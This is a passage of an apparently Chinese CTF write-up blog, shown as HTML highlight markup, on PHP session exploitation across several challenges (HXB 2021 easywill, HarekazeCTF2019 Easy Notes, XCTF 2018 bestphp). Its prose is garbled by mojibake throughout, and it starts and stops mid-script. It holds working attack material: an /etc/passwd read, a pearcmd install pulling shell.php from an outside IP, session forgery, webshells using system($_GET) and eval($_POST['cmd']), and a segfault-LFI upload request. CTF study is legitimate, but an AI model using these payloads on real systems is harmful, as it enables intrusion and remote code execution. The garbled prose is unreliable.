&lt;span style="color:#111">event&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">threading&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Event&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">30&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">threading&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Thread&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">target&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">write&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">,))&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">start&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">30&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">threading&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Thread&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">target&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">,))&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">start&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">event&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">set&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="hxb-2021easywill">[HXB 2021]easywill&lt;/h3>
&lt;p>willphp v2.1.5ï¼Œæ˜¯åŸºäºtpçš„æ¡†æ¶&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">home\controller&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">IndexController&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">index&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">assign&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;name&amp;#39;&lt;/span>&lt;span style="color:#111">],&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;value&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">view&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>assign()å¯ä»¥æ§åˆ¶nameå’Œvalueå‚æ•°ï¼Œè€Œç´§è·Ÿç€çš„viewå‡½æ•°æœ‰ç‚¹ä¸œè¥¿&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211118101839993.png" alt="image-20211118101839993">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211118101952307.png" alt="image-20211118101952307">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211118102033617.png" alt="image-20211118102033617">&lt;/p>
&lt;p>å¯ä»¥çœ‹åˆ°æœ€åçš„49è¡Œæœ‰æ–‡ä»¶å†™å…¥çš„ç‚¹ï¼Œ51è¡Œæœ‰ä¸ª&lt;code>extract()&lt;/code>å¯ä»¥åšåˆ°å˜é‡è¦†ç›–ï¼Œé‚£æˆ‘ä»¬å°±æŠŠfile_put_contentsçš„å‚æ•°æ¢æˆè‡ªå·±æƒ³è¦çš„&lt;/p>
&lt;pre tabindex="0">&lt;code>/?name=cfile&amp;amp;value=/etc/passwd
&lt;/code>&lt;/pre>&lt;p>å¯ä»¥æ­£å¸¸å›æ˜¾&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211118102448850.png" alt="image-20211118102448850">&lt;/p>
&lt;p>ä¸è¿‡flagæ–‡ä»¶çš„åå­—å¹¶ä¸æ˜¯flagï¼Œæˆ‘ä»¬å¯ä»¥ç”¨pearcmdå†™shellçš„æ–¹æ³•æ¥ä¸ªwebshellï¼ˆè¯¦ç»†çš„å¯ä»¥å‚è€ƒæˆ‘ä¹‹å‰å†™è¿‡çš„å¦ä¸€ä¸ªé¢˜-&amp;gt;&lt;a href="https://amiaaaz.github.io/2021/10/26/qwnt2021-wp/#give_me_you_0day">[å¼ºç½‘æ‹Ÿæ€ 2021]Give_me_your_0day&lt;/a>&lt;/p>
&lt;pre tabindex="0">&lt;code>/?name=cfile&amp;amp;value=/../../../../usr/local/lib/php/pearcmd.php&amp;amp;+install+-R+/tmp+http://101.35.114.107:2301/shell.php
&lt;/code>&lt;/pre>&lt;p>ä¸è¿‡è¿™é‡Œè¦æ³¨æ„shellçš„å†™æ³•ï¼Œå¸¸è§„çš„&lt;code>&amp;lt;?php eval($_POST['a']);?&amp;gt;&lt;/code>è¿™æ ·çš„æ˜¯ä¸è¡Œçš„ï¼Œä¸‹è½½å°±ä¼šæŠ¥é”™&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211118103659930.png" alt="image-20211118103659930">&lt;/p>
&lt;p>æ‰§è¡Œä¹Ÿä¼šæŠ¥é”™ï¼Œè¿™é‡Œçš„shellè¦è¿™æ ·å†™&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;lt;?php system(&amp;#34;ls /&amp;#34;);&amp;#39;&lt;/span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211118105922638.png" alt="image-20211118105922638">&lt;/p>
&lt;p>ä¹‹åç›´æ¥æŠŠvalueçš„å€¼æ¢æˆflagæ–‡ä»¶åå³å¯&lt;/p>
&lt;pre tabindex="0">&lt;code>/?name=cfile&amp;amp;value=/flag32897328937298hdwidh
&lt;/code>&lt;/pre>&lt;p>â€”â€”â€”â€”ä¸è¿‡è¿™é‡Œæˆ‘ç›´æ¥å†™ğŸä¸€ç›´æˆåŠŸä¸äº†ï¼Œåªèƒ½è¿œç¨‹åŒ…å«ğŸ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211118110226581.png" alt="image-20211118110226581">&lt;/p>
&lt;p>â€”â€”â€”â€”è¯¶ï¼Œè¯´äº†åŠå¤©ï¼Œå…¶å®å’Œæœ¬ç¯‡æœ‰å…³çš„åœ¨éé¢„æœŸçš„ç‚¹ï¼Œå’Œä¸Šé¢çš„è„šæœ¬å‡ ä¹ä¸€æ ·ï¼Œè¦æ”¹çš„åœ°æ–¹åœ¨äºreadéƒ¨åˆ†çš„urläº†&lt;/p>
&lt;pre tabindex="0">&lt;code>?name=cfile&amp;amp;value=/tmp/sess_'+sessid
&lt;/code>&lt;/pre>&lt;h2 id="ååºåˆ—åŒ–">ååºåˆ—åŒ–&lt;/h2>
&lt;p>è¿™é‡Œè¯¦ç»†çš„è®²è§£å¯ä»¥å‚ç…§&lt;a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/">PHPä¸­SESSIONååºåˆ—åŒ–æœºåˆ¶&lt;/a>ï¼Œå°±ä¸åšå¤åˆ¶ç²˜è´´å·¥ç¨‹å¸ˆäº†ï¼Œç”¨è‡ªå·±çš„è¯è®²å‡ ä¸ªé‡Œé¢å·²ç»æè¿‡çš„ç‚¹å§&lt;/p>
&lt;p>é¦–å…ˆï¼Œè¿™é‡Œçš„é—®é¢˜ï¼ˆæˆ‘ä»¬å¯ä»¥æ”»å‡»çš„åŸå› ï¼‰å‡ºç°åœ¨ä¸¤ç§åºåˆ—åŒ–å¼•æ“æ··ç”¨çš„æƒ…å†µä¸‹ï¼Œå½“æäº¤&lt;/p>
&lt;pre tabindex="0">&lt;code>?a=|O:8:&amp;quot;stdClass&amp;quot;:0:{}
&lt;/code>&lt;/pre>&lt;p>æ—¶ï¼Œ&lt;code>php_serialize&lt;/code>æ–¹å¼ä¸‹ä¼šè¢«å­˜å‚¨ä¸º&lt;/p>
&lt;pre tabindex="0">&lt;code>a:1:{s:1:&amp;quot;a&amp;quot;;s:20:&amp;quot;|O:8:&amp;quot;stdClass&amp;quot;:0:{}&amp;quot;;}
&lt;/code>&lt;/pre>&lt;p>ä½†æ˜¯è¢«&lt;code>php&lt;/code>æ–¹å¼åˆ™ä¼šè§£æä¸º&lt;/p>
&lt;pre tabindex="0">&lt;code>a:1:{s:1:&amp;quot;a&amp;quot;;s:20:&amp;quot;=O:8:&amp;quot;stdClass&amp;quot;:0:{}&amp;quot;;}
&lt;/code>&lt;/pre>&lt;p>åœ¨å…·ä½“åº”ç”¨æ—¶ï¼Œå¯æ§çš„ç‚¹é™¤äº†get/postçš„å‚æ•°ä¹‹å¤–ï¼Œè¿˜å¯ä»¥æ¥ç€æ„é€ æ–‡ä»¶ä¸Šä¼ çš„è¡¨å•ï¼Œé™¤äº†&lt;code>PHPSESSID&lt;/code>ä¹‹å¤–çš„åºŸç‰©æ–‡ä»¶çš„æ–‡ä»¶åå°±å¯ä»¥å½“æ­¤å¤§ä»»ï¼Œè®°å¾—åºåˆ—åŒ–å­—ç¬¦å‰é¢è¦åŠ ä¸Š&lt;code>|&lt;/code>ï¼Œå†…éƒ¨çš„åŒå¼•å·è¦ç”¨&lt;code>\&lt;/code>è¿›è¡Œè½¬ä¹‰&lt;/p>
&lt;h3 id="harekazectf2019easy-notes">[HarekazeCTF2019]Easy Notes&lt;/h3>
&lt;p>è¿™ä¸ªé¢˜å¾—å®¡&lt;a href="https://github.dev/TeamHarekaze/HarekazeCTF2019-challenges/tree/master/easy_notes/server/public">æºç &lt;/a>&lt;/p>
&lt;p>æœ‰æ·»åŠ note å¯¼å‡ºnoteçš„åŠŸèƒ½ï¼Œä½†æ˜¯å´ä¸æ˜¯å¸¸è§çš„xssï¼ˆå› ä¸ºæ˜¯phpå†™çš„å˜›ï¼‰ï¼Œä¼šæ£€æµ‹sessionä¸­çš„adminæ˜¯ä¸æ˜¯true&lt;/p>
&lt;p>æˆ‘ä»¬çš„çªç ´å£åœ¨å¯¼å‡º.zipè¿™ä¸ªåŠŸèƒ½ä¸Š&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203112810148.png" alt="image-20211203112810148">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203113735250.png" alt="image-20211203113735250">&lt;/p>
&lt;p>æˆ‘ä»¬å¯ä»¥æ‰‹åŠ¨ä¼ªé€ ä¸€ä¸ªsessionæ–‡ä»¶ï¼Œä¹‹åå°†PHPSESSIDè®¾ä¸ºç”Ÿæˆçš„å€¼å³å¯ï¼Œå†…å®¹å‘¢ å°±æ˜¯admin=1&lt;/p>
&lt;pre tabindex="0">&lt;code>xxxx|N;admin|b:1;xxxxxx
&lt;/code>&lt;/pre>&lt;p>ç”¨&lt;code>xxxx|N;&lt;/code>é—­åˆå‰é¢è„æ•°æ®ï¼Œç¼–è¾‘åˆ°titleä¸­ï¼Œå°†sessionçš„PHPSESSIDè®¾ç½®å¥½å°±å¯ä»¥getflagäº†&lt;/p>
&lt;h3 id="xctf-final-2018bestphp">[XCTF final 2018]bestphp&lt;/h3>
&lt;p>&lt;a href="https://github.com/shimmeris/CTF-Web-Challenges/tree/master/File-Inclusion/XCTF-Final-2018-Bestphp">è¿™é‡Œæ˜¯dockerç¯å¢ƒ&lt;/a>ï¼ˆæ³¨æ„è®¾ç½®æš´éœ²ç«¯å£ å¦å¤–é¦–é¡µçš„index.phpçš„submitè¦æ”¹ä¸€ä¸‹&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211129171252486.png" alt="image-20211129171252486">&lt;/p>
&lt;p>è¿™é‡Œæœ‰ç†Ÿæ‚‰çš„&lt;code>call_user_func&lt;/code>ï¼Œæ¥è¯»ä¸€ä¸‹admin.phpçš„æºç &lt;/p>
&lt;pre tabindex="0">&lt;code>?function=extract&amp;amp;file=php://filter/convert.base64-encode/resource=admin.php
&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#75af00">hello&lt;/span> &lt;span style="color:#75af00">admin&lt;/span>
&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">empty&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_SESSION&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;name&amp;#39;&lt;/span>&lt;span style="color:#111">])){&lt;/span>
&lt;span style="color:#75af00">session_start&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75715e">#echo &amp;#39;hello &amp;#39; + $_SESSION[&amp;#39;name&amp;#39;];
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;you must login with admin&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å†è¯»ä¸€ä¸‹function.phpï¼Œä½†æ˜¯å¥½åƒè¿™ä¿©éƒ½æ²¡å•¥ç”¨&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">filters&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$data&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">foreach&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$data&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#f92672">=&amp;gt;&lt;/span>&lt;span style="color:#111">$value&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/eval|assert|exec|passthru|glob|system|popen/i&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$value&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;Do not hack me!&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¾ˆæ˜¾ç„¶æˆ‘ä»¬éœ€è¦åˆ©ç”¨sessionåŒ…å«ï¼Œä½†æ˜¯index.phpä¸­è®¾ç½®äº†open_basedirï¼Œé»˜è®¤çš„sessionè·¯å¾„æ˜¯&lt;code>/var/lib/php/sessions/sess_phpsessid&lt;/code>ï¼Œä¸è¿‡æœ‰ä¸ªæ–¹å¼å¯ä»¥æ›´æ”¹sessionå­˜å‚¨ç›®å½•&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211129172602323.png" alt="image-20211129172602323">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211129172609578.png" alt="image-20211129172609578">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211129172619585.png" alt="image-20211129172619585">&lt;/p>
&lt;p>é‚£æˆ‘ä»¬å°±å¯ä»¥æŠŠshellå†™åˆ°webæ ¹ç›®å½•ä¸‹&lt;/p>
&lt;pre tabindex="0">&lt;code>?function=session_start&amp;amp;save_path=.
POST: name=&amp;lt;?php echo &amp;quot;aaa&amp;quot;;system($_GET[x]);?&amp;gt;
&lt;/code>&lt;/pre>&lt;p>ä¸€èˆ¬çš„ä¸€å¥è¯ä¼šæ²¡æ³•æ­£å¸¸å·¥ä½œï¼ˆä¹‹å‰æ¹–æ¹˜æ¯willphpä¹Ÿæ˜¯è¿™æ ·ï¼Œé‚£ä¸ªæ˜¯&lt;code>&amp;lt;?php echo '&amp;lt;?php system(&amp;quot;ls /&amp;quot;);'?&amp;gt;&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code>?function=extract&amp;amp;file=/var/www/html/sess_qwer&amp;amp;x=ls
?function=extract&amp;amp;file=/var/www/html/sess_qwer&amp;amp;x=cat+fsadgsdagsadgasd.php
&lt;/code>&lt;/pre>&lt;p>æ‹¿åˆ°flag&lt;/p>
&lt;h4 id="è§£æ³•2php70---lfi-via-segmentfault">è§£æ³•2ï¼šphp7.0 - LFI via SegmentFault&lt;/h4>
&lt;p>å‚è€ƒï¼š&lt;a href="https://www.jianshu.com/p/dfd049924258">LFI via SegmentFault&lt;/a>&lt;/p>
&lt;pre tabindex="0">&lt;code>include.php?file=php://filter/string.strip_tags/resource=/etc/passwd
&lt;/code>&lt;/pre>&lt;p>&lt;code>string.strip_tags&lt;/code>å¯ä»¥å¯¼è‡´phpåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­Segment Fault&lt;/p>
&lt;p>å¦‚æœè¯·æ±‚ä¸­åŒæ—¶å­˜åœ¨ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„è¯·æ±‚ï¼Œè¿™ä¸ªæ–‡ä»¶ä¼šè¢«ä¿ç•™ï¼Œå­˜å‚¨åœ¨/tmp/phpxxxxxxxxxxxï¼ˆxxxxxæ˜¯æ•°å­—+å­—æ¯çš„6ä½æ•°ï¼‰ï¼Œè¿™ä¸ªæ–‡ä»¶è¿ç»­ä¿å­˜ï¼Œä¸ç”¨ç«äº‰ç›´æ¥çˆ†ç ´ï¼ˆå¤šçº¿ç¨‹ä¸Šä¼ æ–‡ä»¶ï¼Œç”Ÿæˆå¤šä¸ªphpxxxxxxxxxxxï¼‰&lt;/p>
&lt;p>åˆ©ç”¨expï¼ˆæ‰“å‡ºæ¥502æ˜¯æ­£å¸¸æƒ…å†µ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-http" data-lang="http">&lt;span style="color:#75af00">POST&lt;/span> &lt;span style="color:#111">/index.php?function=extract&amp;amp;file=php://filter/string.strip_tags/resource=function.php&lt;/span> &lt;span style="color:#00a8c8">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;span style="color:#111">Host&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">101.35.114.107:20004&lt;/span>
&lt;span style="color:#111">Content-Length&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">1701&lt;/span>
&lt;span style="color:#111">Cache-Control&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">max-age=0&lt;/span>
&lt;span style="color:#111">Origin&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">null&lt;/span>
&lt;span style="color:#111">Upgrade-Insecure-Requests&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;span style="color:#111">DNT&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;span style="color:#111">Content-Type&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">multipart/form-data; boundary=----WebKitFormBoundaryeScXqSzdW2v22xyk&lt;/span>
&lt;span style="color:#111">User-Agent&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36&lt;/span>
&lt;span style="color:#111">Accept&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&lt;/span>
&lt;span style="color:#111">Accept-Encoding&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">gzip, deflate&lt;/span>
&lt;span style="color:#111">Accept-Language&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7&lt;/span>
&lt;span style="color:#111">Cookie&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">PHPSESSID=17qpuv1r8g19pm503593nddq10&lt;/span>
&lt;span style="color:#111">Connection&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">close&lt;/span>
------WebKitFormBoundaryeScXqSzdW2v22xyk
Content-Disposition: form-data; name=&amp;#34;fileUpload&amp;#34;; filename=&amp;#34;test.jpg&amp;#34;
Content-Type: image/jpeg
&amp;lt;?php echo &amp;#34;wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww&amp;#34;;@eval($_POST[&amp;#39;cmd&amp;#39;]); ?&amp;gt;
------WebKitFormBoundaryeScXqSzdW2v22xyk--
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¸Šå¸è§†è§’çœ‹çš„è¯æ˜¯è¿™æ ·&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211129183250382.png" alt="image-20211129183250382">&lt;/p>
&lt;p>ç”¨pyè„šæœ¬çˆ†ç ´å‡ºæ¥(py2)&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">string&lt;/span>
&lt;span style="color:#111">charset&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">digits&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">letters&lt;/span>
&lt;span style="color:#111">host&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;10.99.99.16&amp;#34;&lt;/span>
&lt;span style="color:#111">port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">80&lt;/span>
